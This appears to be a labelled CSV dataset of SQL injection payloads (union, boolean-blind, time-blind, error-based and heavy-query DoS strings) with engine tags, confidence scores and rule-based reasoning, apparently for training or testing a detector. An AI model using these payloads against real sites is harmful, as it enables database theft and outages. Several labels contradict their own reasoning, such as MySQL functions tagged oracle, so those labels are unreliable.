id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
18902,"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'pcim' = 'pcim",heavy_query,generic,0.9,"'case when' -> boolean_blind (P3): CASE WHEN conditional select for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18903,"1'|| ( select 'rqzu' from dual where 9516 = 9516 or elt ( 5873 = 5873,sleep ( 5 ) ) #",boolean_blind,oracle,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=oracle,3
18904,"1%"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""%"" = """,heavy_query,generic,0.9,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18905,"1' where 9156 = 9156 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.9,"'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18906,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'ekhi' = 'ekhi",heavy_query,generic,0.9,"'AND/OR 'x'='x'' -> boolean_blind (P3): AND/OR string equality tautology for boolean blind | 'repeat(...,500000000)' -> heavy_query (P4): repeat() with huge count (>=10^7) creates DoS-style heavy query | db_engine=generic",2
18907,select ( case when ( 7005 = 7118 ) then 1 else 7005* ( select 7005 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.9,'master..sysdatabases' -> boolean_blind (P3): master..sysdatabases used in CASE WHEN for MSSQL boolean blind | db_engine=mssql,3
18908,"1%"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.8,"'""x""=""x""' -> boolean_blind (P3): Double-quoted string equality tautology for boolean blind | 'benchmark(' -> time_blind (P5): benchmark() is MySQL CPU-burn time-based blind | db_engine=mysql",1
18909,1' or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.85,'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18910,"-4394' ) ) union all select 3409,3409--",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18911,1' ) where 1645 = 1645 rlike sleep ( 5 ) --,boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18912,"-6890"" ) ) ) union all select 1115#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18913,1 ) ) rlike sleep ( 5 ) and ( ( 8773 = 8773,boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18914,"-7255' union all select 2127,2127,2127,2127,2127#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18915,"1%"" ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ""%"" = """,boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'updatexml(' -> error_based (P4): updatexml() triggers MySQL XPath error | db_engine=mysql,2
18916,"1' in boolean mode ) union all select null,null,null,null,null--",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18917,"-4385%' ) ) union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18918,"1 where 1153 = 1153 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'extractvalue(' -> error_based (P4): extractvalue() triggers MySQL XPath error | db_engine=mysql,2
18919,"1' and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,0.85,'benchmark(' -> time_blind (P5): benchmark() is MySQL CPU-burn time-based blind | db_engine=mysql,2
18920,"1' ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( 'blnh' like 'blnh",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'extractvalue(' -> error_based (P4): extractvalue() triggers MySQL XPath error | db_engine=mysql,2
18921,1'+ ( select 'toec' where 5810 = 5810 and sleep ( 5 ) ) +',time_blind,mysql,0.85,'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18922,"1', ( begin if ( 8340 = 8340 ) then dbms_lock.sleep ( 5 )",time_blind,oracle,0.9,'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=oracle,3
18923,"1"" ) ) as daqd where 4390 = 4390 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,3
18924,"-2009%' union all select 1991,1991#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18925,"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 'fele' = 'fele",boolean_blind,mysql,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18926,1 ) where 2199 = 2199 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,0.85,'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18927,"1' where 4417 = 4417 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,0.85,'dbms_pipe.receive_message' -> time_blind (P5): dbms_pipe.receive_message is Oracle time-based blind | db_engine=oracle,3
18928,"-1620 ) ) union all select 6257,6257,6257,6257,6257,6257,6257,6257,6257,6257--",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18929,"1 ) where 9206 = 9206 union all select null,null,null,null,null,null#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18930,"-1512 union all select 9013,9013,9013,9013#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18931,1 waitfor delay '0:0:5'-- nnnp,time_blind,mssql,0.85,'waitfor delay' -> time_blind (P5): WAITFOR DELAY is MSSQL time-based blind | db_engine=mssql,3
18932,"-6662"" ) ) union all select 6755--",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18933,1'+ ( select 'hplm' where 4008 = 4008 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.85,'pg_sleep(' -> time_blind (P5): pg_sleep() is PostgreSQL time-based blind function | db_engine=postgresql,2
18934,1'|| ( select 'oxdh' where 6967 = 6967 and sleep ( 5 ) #,time_blind,mysql,0.85,'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18935,"-5776%' union all select 3075,3075,3075,3075,3075--",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18936,"1' ) ) as oldh where 9551 = 9551 union all select null,null,null#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18937,1 rlike sleep ( 5 ) #,boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18938,1%' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( '%' = ',time_blind,mysql,0.85,'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,2
18939,"1%"" ) ) union all select null--",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18940,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 'zqiw' = 'zqiw,boolean_blind,mysql,0.9,'rlike' -> boolean_blind (P3): RLIKE is MySQL regex boolean | 'sleep(' -> time_blind (P5): sleep() is MySQL time-based blind function | db_engine=mysql,3
18941,"1' ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18942,"-8153' where 2436 = 2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",union_based,generic,0.8,'UNION SELECT (x1)' -> union_based (P7): Detected 1 UNION SELECT clause(s) for data extraction | db_engine=generic,3
18943,"1'|| ( select 'fcws' from dual where 9184 = 9184 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) ||'",boolean_blind,oracle,0.9,'elt(' -> boolean_blind (P3): ELT() is MySQL boolean conditional select | 'updatexml(' -> error_based (P4): updatexml() triggers MySQL XPath error | db_engine=oracle,2
